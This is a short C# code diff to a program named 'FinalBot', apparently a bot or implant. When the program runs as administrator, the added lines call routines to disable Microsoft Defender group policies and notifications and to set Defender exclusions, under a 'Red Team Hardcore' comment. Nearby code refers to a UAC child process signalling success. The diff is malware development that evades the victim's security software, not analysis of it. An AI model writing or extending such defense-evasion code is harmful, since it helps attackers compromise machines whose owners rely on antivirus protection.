@@ -132,7 +132,13 @@ namespace FinalBot
             }
             else
             {
-                DebugLog("Running as ADMIN.");
+                DebugLog("Running as ADMIN. Applying Defender suppressions...");
+                
+                // Red Team Hardcore: Disable Defender GPOs and Notifications
+                SafetyManager.DisableDefenderGpo();
+                SafetyManager.DisableDefenderNotifications();
+                SafetyManager.BypassDefenderPlatform(); // Set exclusions
+
                 if (args.Length > 0 && Array.Exists(args, a => a == "--uac-child"))
                 {
                     DebugLog("Child process signaled success event.");
